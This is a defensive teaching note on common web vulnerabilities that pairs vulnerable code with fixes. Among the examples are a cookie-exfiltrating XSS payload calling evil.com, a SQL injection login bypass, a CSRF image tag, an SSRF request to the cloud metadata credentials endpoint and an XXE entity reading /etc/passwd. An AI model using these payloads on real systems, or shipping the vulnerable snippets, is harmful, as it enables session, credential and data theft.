# Web security

Web security is the practice of keeping web applications resistant to attacks that steal data, hijack sessions, or take systems offline. Almost every serious breach traces back to a handful of well-understood vulnerability classes — this note covers what they are, how they're actually exploited, and how to fix them, plus real breaches that resulted from getting them wrong.

## TL;DR
- **CIA triad**: Confidentiality (no unauthorized reads), Integrity (no unauthorized writes/tampering), Availability (system stays up). Every vulnerability below breaks one or more of these.
- Never trust user input — validate and sanitize everything crossing a trust boundary.
- Most of the vulnerabilities below (XSS, SQLi, CSRF, IDOR, SSRF, XXE) come from the same root cause: **untrusted input gets treated as code, or a request gets accepted without checking who's really asking.**
- Defense in depth beats any single control — parameterized queries *and* least-privilege DB accounts *and* WAF rules, not just one.
- OWASP Top 10 is the industry-standard checklist; this note walks through the classes that matter most in practice.

## The CIA triad and threat basics

- **Confidentiality** — only authorized parties can read data. Broken by: SQL injection dumping a database, IDOR exposing another user's records, misconfigured S3 buckets.
- **Integrity** — data can't be tampered with undetected. Broken by: CSRF forcing unwanted actions, XSS injecting fake content, MITM attacks modifying traffic in transit.
- **Availability** — the system stays reachable and responsive. Broken by: DoS/DDoS attacks, resource-exhaustion bugs (e.g., an unbounded regex or unpaginated query).

**Zero-day vs known exploit**: a zero-day is a vulnerability the vendor doesn't know about yet (no patch exists) — attackers who find one first have a window with no defense available. A known exploit has a published CVE and (usually) a patch — the risk there is entirely about how fast you apply it. Most real-world breaches use known, patched vulnerabilities against systems that simply didn't update — Equifax below is the canonical example.

## Cross-site scripting (XSS)

**What it is**: an attacker gets their JavaScript to run in another user's browser, in the context of your site — meaning it can read cookies, make authenticated requests, log keystrokes, or rewrite the page, all as if it were your own trusted code.

There are three flavors:

| Type | Where the payload lives | Trigger |
|---|---|---|
| **Stored** | Saved in the database (e.g., a comment, profile bio) | Runs for every user who views the page |
| **Reflected** | Bounced back in the response from a request parameter | Runs once, usually via a crafted link sent to a victim |
| **DOM-based** | Never touches the server — JS on the page writes attacker data into the DOM unsafely | Runs client-side only, invisible to server-side logs/filters |

**Vulnerable example** (stored XSS — a comment feature that renders raw HTML):

```javascript
// Vulnerable: renders user input directly as HTML
app.get('/post/:id', (req, res) => {
  const comments = db.getComments(req.params.id);
  const html = comments.map(c => `<div>${c.text}</div>`).join('');
  res.send(`<html><body>${html}</body></html>`);
});
```

If someone posts a comment containing `<script>fetch('https://evil.com/steal?c='+document.cookie)</script>`, that script executes in every visitor's browser with their session cookie attached.

**Fix**: escape output by context, and use a Content-Security-Policy as a second layer.

```javascript
const escapeHtml = require('escape-html');

app.get('/post/:id', (req, res) => {
  const comments = db.getComments(req.params.id);
  const html = comments.map(c => `<div>${escapeHtml(c.text)}</div>`).join('');
  res.send(`<html><body>${html}</body></html>`);
});
```

```
Content-Security-Policy: default-src 'self'; script-src 'self'
```

In practice: use a templating engine that auto-escapes by default (React's JSX, Django templates, Jinja2 with autoescape on) rather than hand-rolling string concatenation into HTML — most modern XSS bugs come from explicitly opting *out* of escaping (`dangerouslySetInnerHTML`, `{% autoescape off %}`, `v-html`) on untrusted data.

## SQL injection

**What it is**: user input gets concatenated directly into a SQL query, letting an attacker change the query's logic — read other users' data, bypass login, or drop tables.

**Vulnerable example**:

```python
# Vulnerable: string-formats user input straight into SQL
def get_user(username, password):
    query = f"SELECT * FROM users WHERE username = '{username}' AND password = '{password}'"
    return db.execute(query)
```

Submitting username `admin' --` as the username (with any password) turns the query into:

```sql
SELECT * FROM users WHERE username = 'admin' --' AND password = '...'
```

`--` comments out the rest of the query, so the password check never happens — instant login bypass. A `UNION SELECT` payload in the same field can be used to exfiltrate arbitrary tables instead.

**Fix**: parameterized queries (prepared statements) — the input is sent to the database as *data*, never parsed as SQL syntax, so injection is structurally impossible regardless of what the string contains.

```python
def get_user(username, password):
    query = "SELECT * FROM users WHERE username = %s AND password_hash = %s"
    return db.execute(query, (username, hash_password(password)))
```

Also apply least-privilege DB accounts (the app's DB user shouldn't have `DROP TABLE` rights) and an ORM that parameterizes by default (SQLAlchemy, Prisma, ActiveRecord) — but note ORMs can still be bypassed if you drop to raw SQL/string interpolation inside them.

## Cross-site request forgery (CSRF)

**What it is**: a malicious site tricks a logged-in user's browser into sending a request to your site. Because browsers attach cookies automatically to any request to a domain, the request looks fully authenticated even though the user never intended to make it.

**Vulnerable example**: a bank transfer endpoint that trusts the session cookie alone.

```html
<!-- Hosted on evil.com; victim just needs to load this page while logged into bank.com -->
<img src="https://bank.com/transfer?to=attacker&amount=10000" style="display:none">
```

If `/transfer` is a GET endpoint (or a POST endpoint an auto-submitting form can hit) and only checks the session cookie, the transfer executes with the victim's identity — no XSS or credential theft needed.

**Fix**: CSRF tokens (a per-session or per-request secret the attacker's page can't read or predict, submitted alongside the cookie) plus `SameSite` cookies as defense in depth.

```javascript
// Server issues a token tied to the session, form must echo it back
app.post('/transfer', csrfProtection, (req, res) => {
  // csrfProtection middleware rejects the request if req.body._csrf
  // doesn't match the token stored in the user's session
  processTransfer(req.body);
});
```

```
Set-Cookie: session=abc123; SameSite=Strict; Secure; HttpOnly
```

`SameSite=Strict` (or `Lax`) stops the browser from attaching the cookie to cross-site requests in the first place — modern browsers default new cookies to `Lax`, which blocks the classic `<img>`/auto-submit-form attack above, but CSRF tokens are still the more explicit, framework-independent fix and matter more for state-changing GETs and older clients.

## Insecure direct object references (IDOR)

**What it is**: an endpoint uses a user-supplied ID to look up a resource, but never checks that the *current* user is actually allowed to access *that* resource — so incrementing an ID in the URL reads or modifies someone else's data.

**Vulnerable example**:

```javascript
// Vulnerable: fetches whatever invoice ID is requested, no ownership check
app.get('/api/invoices/:id', authenticate, (req, res) => {
  const invoice = db.getInvoice(req.params.id);
  res.json(invoice);
});
```

Any logged-in user can view any other user's invoice just by changing `/api/invoices/1042` to `/api/invoices/1043`.

**Fix**: check ownership/authorization on every access, not just authentication.

```javascript
app.get('/api/invoices/:id', authenticate, (req, res) => {
  const invoice = db.getInvoice(req.params.id);
  if (!invoice || invoice.userId !== req.user.id) {
    return res.status(404).send(); // 404, not 403 — don't confirm the ID exists
  }
  res.json(invoice);
});
```

Prefer unguessable identifiers (UUIDs instead of sequential integers) as a second layer — it doesn't fix the missing authorization check, but it stops trivial enumeration. This is the "horizontal" access-control flaw (same privilege level, wrong user's data); "vertical" is a regular user reaching admin-only functionality — same root cause, missing authorization check, different axis.

## Server-side request forgery (SSRF)

**What it is**: the server fetches a URL supplied (directly or indirectly) by the user, and the attacker points it at internal infrastructure the server can reach but the attacker normally can't — internal admin panels, cloud metadata endpoints, other services on the private network.

**Vulnerable example**: a "fetch image from URL" feature.

```python
# Vulnerable: server fetches whatever URL the client supplies
@app.route('/fetch-avatar')
def fetch_avatar():
    url = request.args.get('url')
    resp = requests.get(url)
    return resp.content
```

An attacker submits `url=http://169.254.169.254/latest/meta-data/iam/security-credentials/` (the AWS instance metadata endpoint) — the server, sitting inside the VPC, happily fetches it and returns cloud credentials to the attacker. This exact pattern was central to the 2019 Capital One breach.

**Fix**: allowlist permitted destinations, block requests to private/link-local IP ranges, and don't let the app itself be the one resolving user-supplied hosts when avoidable.

```python
import ipaddress, socket

BLOCKED_RANGES = [ipaddress.ip_network(r) for r in [
    "169.254.0.0/16", "127.0.0.0/8", "10.0.0.0/8", "172.16.0.0/12", "192.168.0.0/16"
]]

def is_safe_url(url):
    host = urlparse(url).hostname
    ip = ipaddress.ip_address(socket.gethostbyname(host))
    return not any(ip in r for r in BLOCKED_RANGES)

@app.route('/fetch-avatar')
def fetch_avatar():
    url = request.args.get('url')
    if not is_safe_url(url):
        return "Blocked", 400
    resp = requests.get(url, timeout=3, allow_redirects=False)  # also watch redirect-based bypasses
    return resp.content
```

Note the `allow_redirects=False` — a classic SSRF-filter bypass is submitting an allowed URL that then 302-redirects to the internal target.

## XML external entity (XXE) injection

**What it is**: an XML parser configured to resolve external entities lets an attacker define an entity that points at a local file or internal URL, and the parser dutifully includes its contents in the parsed output.

**Vulnerable example**:

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<user><name>&xxe;</name></user>
```

If the application parses this with a default (unsafe) XML parser configuration and reflects the `name` field back, the response now contains the contents of `/etc/passwd`. The same technique reaches internal network endpoints via `SYSTEM "http://internal-service/..."`.

**Fix**: disable external entity resolution and DTD processing entirely — almost no legitimate application needs it.

```python
# Vulnerable: lxml/etree with defaults can resolve external entities
from lxml import etree
tree = etree.parse(user_supplied_file)

# Fixed: explicitly disable entity resolution
parser = etree.XMLParser(resolve_entities=False, no_network=True, dtd_validation=False)
tree = etree.parse(user_supplied_file, parser)
```

Most modern XML libraries disable external entities by default (a direct response to XXE's prevalence in the 2010s) — but confirm it explicitly for whatever library you're using, and prefer JSON over XML for new APIs where you have the choice, since it has no equivalent entity-expansion attack surface.

## Security misconfiguration

**What it is**: not a single bug but a category — the system is technically correct but left in an insecure default or forgotten state. This is consistently one of the most common findings in real audits because it's about process, not code.

Common instances:
- Default admin credentials never changed (`admin`/`admin`).
- Verbose error pages in production leaking stack traces, file paths, or DB schema.
- Directory listing enabled, exposing files not meant to be public.
- Missing security headers (`Content-Security-Policy`, `X-Frame-Options`, `Strict-Transport-Security`).
- Cloud storage (S3 buckets, etc.) left publicly readable/writable.
- Unnecessary services/ports exposed (an admin panel reachable from the public internet instead of VPN-only).

**Fix pattern**: harden by removing defaults and disabling what you don't use.

```
# Example security headers a reverse proxy should set
Strict-Transport-Security: max-age=63072000; includeSubDomains
X-Content-Type-Options: nosniff
X-Frame-Options: DENY
Content-Security-Policy: default-src 'self'
Referrer-Policy: strict-origin-when-cross-origin
```

```python
# Vulnerable: Flask debug mode in production leaks stack traces + allows code execution via the debugger
app.run(debug=True)

# Fixed
app.run(debug=False)
```

Treat this as a checklist item in deployment, not a one-time fix — configuration drifts over time (a debug flag left on after an incident, a bucket policy loosened for a one-off script and never reverted).

## Broken authentication & session hijacking

**What it is**: flaws in how a system verifies identity or maintains a logged-in session — weak password policies, no brute-force protection, predictable session tokens, or sessions that don't actually expire.

Common failure modes:
- **Credential stuffing**: attackers replay breached username/password pairs from other sites, since users reuse passwords. No rate limiting on login means this is fully automatable.
- **Session fixation**: the app doesn't regenerate the session ID after login, so an attacker who set a victim's session ID before they logged in can reuse it afterward.
- **Predictable session tokens**: sequential or low-entropy session IDs can be guessed or brute-forced.
- **Missing MFA** on high-value accounts.

**Vulnerable example** (no rate limiting, session ID not rotated on login):

```javascript
app.post('/login', (req, res) => {
  const user = db.findUser(req.body.username);
  if (user && verifyPassword(req.body.password, user.hash)) {
    req.session.userId = user.id; // reuses whatever session ID already existed
    res.send('OK');
  } else {
    res.status(401).send('Invalid credentials');
  }
});
```

**Fix**: rate-limit auth attempts, regenerate the session on privilege change, set secure cookie flags, and offer MFA.

```javascript
app.post('/login', loginRateLimiter, (req, res) => {
  const user = db.findUser(req.body.username);
  if (user && verifyPassword(req.body.password, user.hash)) {
    req.session.regenerate(() => {          // new session ID post-login
      req.session.userId = user.id;
      res.cookie('session', req.sessionID, { httpOnly: true, secure: true, sameSite: 'strict' });
      res.send('OK');
    });
  } else {
    res.status(401).send('Invalid credentials'); // same message either way — don't leak which field was wrong
  }
});
```

Password verification itself is its own deep topic — see [scrypt-and-bcrypt.md](./hashing-algos/scrypt-and-bcrypt.md) for why passwords need slow, salted hashing (never plain SHA-256, never MD5).

## Denial-of-service (DoS / DDoS)

**What it is**: overwhelming a system's capacity — bandwidth, connections, CPU, or application logic — so legitimate users can't get a response. **DoS** is one source; **DDoS** (distributed) uses many sources (often a botnet) to make blocking-by-IP ineffective.

Categories:
- **Volumetric**: raw traffic floods (UDP floods, amplification attacks) that saturate bandwidth. The 2018 GitHub attack (1.3 Tbps) used memcached amplification — small spoofed requests to misconfigured memcached servers triggered massive responses directed at the victim.
- **Protocol**: exploits weaknesses in network protocol handling (SYN floods exhausting connection tables).
- **Application-layer**: fewer requests, but each is expensive to process — e.g., a search endpoint with an unindexed query, or a regex vulnerable to catastrophic backtracking (ReDoS).

**Vulnerable example** (ReDoS — a regex whose backtracking blows up on crafted input):

```javascript
// Vulnerable: nested quantifiers cause exponential backtracking on pathological input
const re = /^([a-zA-Z]+)*$/;
re.test("aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa!");
// Single request can pin a CPU core for seconds to minutes — trivial to weaponize
```

**Fix**: rate limiting, timeouts, and avoiding pathological regex patterns.

```javascript
const re = /^[a-zA-Z]+$/; // no nested quantifier — linear time

// Rate limit at the edge
app.use(rateLimit({ windowMs: 60_000, max: 100 }));
```

Volumetric/protocol-layer DDoS is generally mitigated at the infrastructure layer (CDN/scrubbing services like Cloudflare, AWS Shield) rather than in application code — the app-layer fixes above (rate limiting, avoiding expensive per-request operations, pagination limits, timeouts) are what's actually in a developer's control.

## API security risks

APIs get a dedicated mention because they're often less scrutinized than the browser-facing app — no UI hides a raw endpoint from a scanner.

- **API key leaks**: keys committed to public repos, embedded in mobile app binaries (trivially extracted), or logged in plaintext. Treat API keys like passwords — environment variables or a secrets manager, never hardcoded, and rotate on suspected exposure.
- **Excessive data exposure**: an endpoint returns the full internal object (`{id, email, password_hash, internal_notes, ...}`) and relies on the frontend to only display the safe fields — but anyone can call the API directly and see everything.
- **Broken object-level authorization**: the API version of IDOR above — extremely common because REST/GraphQL APIs expose resource IDs directly.
- **Lack of rate limiting**: no cap on requests per key/IP, enabling both brute force and cost-based abuse (expensive AI/compute-backed endpoints hit thousands of times).
- **Mass assignment**: an endpoint blindly binds the entire request body to a model, letting an attacker set fields they shouldn't (`{"role": "admin"}` slipped into a profile-update payload).

**Vulnerable example** (mass assignment):

```javascript
// Vulnerable: whatever fields the client sends get written straight to the user record
app.patch('/api/users/:id', authenticate, (req, res) => {
  db.updateUser(req.params.id, req.body); // body could include { "role": "admin" }
  res.send('OK');
});
```

**Fix**: explicitly allowlist updatable fields.

```javascript
app.patch('/api/users/:id', authenticate, (req, res) => {
  const { displayName, bio } = req.body; // only these fields are ever accepted
  db.updateUser(req.params.id, { displayName, bio });
  res.send('OK');
});
```

## 🟢 Beginner: the baseline habits

- Never trust user input — validate type, length, format, and range server-side (client-side validation is a UX nicety, not a security control; it's trivially bypassed).
- Use parameterized queries/ORMs, never string-concatenated SQL.
- Escape output for its context (HTML, URL, JS string) — auto-escaping templating engines by default.
- Hash passwords with bcrypt/scrypt/Argon2, never MD5/SHA-256 alone (see the hashing-algos notes).
- Use HTTPS everywhere, set `HttpOnly`/`Secure`/`SameSite` on cookies.
- Keep dependencies updated — most breaches exploit *known*, already-patched vulnerabilities in outdated libraries.

## 🟡 Intermediate: process and defense in depth

- **Principle of least privilege**: a service account, IAM role, or DB user should have exactly the permissions it needs and nothing more — so a single compromised component can't cascade into full access.
- **Defense in depth**: stack independent controls (parameterized queries + least-privilege DB user + WAF rule) so one failure doesn't mean total compromise.
- **Dependency auditing**: `npm audit`, `pip-audit`, Dependabot/Snyk in CI — catch known-vulnerable packages before they ship, not after.
- **Security headers as a baseline**: CSP, HSTS, X-Content-Type-Options, X-Frame-Options — cheap to add, closes off whole attack classes (clickjacking, MIME sniffing).
- **Secrets management**: environment variables at minimum, a real secrets manager (Vault, AWS Secrets Manager) for anything beyond a small team — never commit secrets, and treat any committed secret as compromised (rotate, don't just delete from history).

## 🔴 Advanced: testing, architecture, and what's next

- **OWASP Testing Guide** structures a full audit: information gathering (fingerprinting, hidden files like `robots.txt`/`.DS_Store`), configuration review, auth/session testing, authorization testing (horizontal + vertical), injection testing across SQL/NoSQL/LDAP/XPath, business-logic testing (feature misuse, missing non-repudiation), and cryptography review.
- **Penetration testing & tooling**: Burp Suite and OWASP ZAP for manual/automated web app testing; SAST (static analysis) and DAST (dynamic analysis) integrated into CI so vulnerabilities are caught pre-merge, not post-incident.
- **Business logic vulnerabilities** are the hardest class to catch with tools — they're not "broken code," they're a legitimate feature used in an unintended sequence (e.g., applying a discount coupon multiple times by racing two concurrent requests, or exploiting a missing state-transition check in a checkout flow).
- **Zero-trust architecture**: don't grant implicit trust based on network location ("it's inside the VPC, so it's safe") — every request authenticates and authorizes regardless of origin. This is a direct response to how SSRF and lateral-movement breaches work: internal network position stops being a meaningful security boundary.
- **Post-quantum cryptography**: current asymmetric crypto (RSA, ECC) is theoretically breakable by a sufficiently large quantum computer (Shor's algorithm); NIST has been standardizing quantum-resistant algorithms (ML-KEM/Kyber, ML-DSA/Dilithium) for future migration. Not an urgent concern for most teams today, but worth knowing the direction of travel for anything with a long confidentiality horizon (data that must stay secret for decades).

## Real-world case studies

**Equifax (2017)** — a known, patched vulnerability in Apache Struts (CVE-2017-5638, a remote code execution flaw in the Jakarta Multipart parser) went unpatched for months after the fix was public. Attackers used it to gain a foothold and eventually exfiltrated sensitive data (SSNs, birth dates, addresses) for roughly 147 million people. The vulnerability itself wasn't novel — the failure was patch management: a fix existed and simply wasn't applied in time. This is the textbook argument for automated dependency scanning and a real patching SLA, not just "we'll get to it."

**Heartland Payment Systems (2008)** — SQL injection against payment-processing systems led to the theft of over 100 million credit card numbers, one of the largest breaches at the time. It pushed the payment industry toward stricter PCI-DSS requirements around network segmentation and data handling.

**GitHub DDoS (2018)** — a 1.3 Tbps memcached amplification attack, the largest recorded at the time. Misconfigured memcached servers (exposed to the internet, UDP enabled) reflected small spoofed requests into massive responses aimed at GitHub. Mitigated within minutes via DDoS scrubbing infrastructure — an example of why volumetric attacks are an infrastructure problem, not something application code can defend against alone.

**Samy Kamkar's MySpace worm (2005)** — a stored XSS payload in a MySpace profile silently added "Samy is my hero" and re-injected itself into every viewer's profile, becoming self-propagating. It hit over a million profiles in under 24 hours — one of the fastest-spreading worms ever, purely through a browser-executed script with no malware download involved. It's the canonical demonstration of what stored XSS can do once it's self-replicating.

## Common pitfalls / gotchas

- **Client-side-only validation.** Anything enforced only in JavaScript is advisory, not security — an attacker just calls the API directly with curl.
- **Confusing authentication with authorization.** "Logged in" is not "allowed to access this specific resource" — that's the IDOR root cause, over and over.
- **Rolling your own crypto/auth.** Session management, password hashing, and token signing have well-known correct implementations (established libraries/frameworks); custom versions consistently reintroduce solved problems.
- **Trusting internal network position as a security boundary.** SSRF and lateral movement both exploit exactly this assumption.
- **Verbose errors in production.** Stack traces are a gift to attackers — they reveal framework versions, file paths, and sometimes query structure.
- **Treating security as a launch-day checklist instead of ongoing practice.** Dependencies age, configurations drift, and new vulnerability classes get discovered in code that hasn't changed at all.

## Quick reference

| Vulnerability | Root cause | Primary fix |
|---|---|---|
| XSS | Unescaped output rendered as HTML/JS | Context-aware output escaping + CSP |
| SQL injection | Unparameterized query built from input | Parameterized queries / prepared statements |
| CSRF | State-changing request trusts cookie alone | CSRF tokens + `SameSite` cookies |
| IDOR | Missing per-request authorization check | Verify ownership on every access |
| SSRF | Server fetches attacker-controlled URL | Allowlist destinations, block private IP ranges |
| XXE | XML parser resolves external entities | Disable DTD/external entity resolution |
| Security misconfiguration | Insecure defaults left in place | Harden defaults, remove what's unused |
| Broken auth | Weak session/credential handling | Rate limiting, session regeneration, MFA |
| DoS/DDoS | Resource exhaustion (network or app-layer) | Rate limiting + CDN/scrubbing for volumetric |
| API risks | Raw endpoints under-scrutinized vs UI | Allowlist fields, object-level auth, rate limits |

## Further reading
- [OWASP Web Security Testing Guide](https://owasp.org/www-project-web-security-testing-guide/)
- [OWASP Top 10](https://owasp.org/www-project-top-ten/)
- [NIST Cybersecurity Framework](https://www.nist.gov/cyberframework)
- [GitHub Security Lab](https://securitylab.github.com/)
- [scrypt-and-bcrypt.md](./hashing-algos/scrypt-and-bcrypt.md) — correct password-hashing approach
- [sha.md](./hashing-algos/sha.md) / [md5.md](./hashing-algos/md5.md) — hash function internals and where they're (and aren't) safe to use
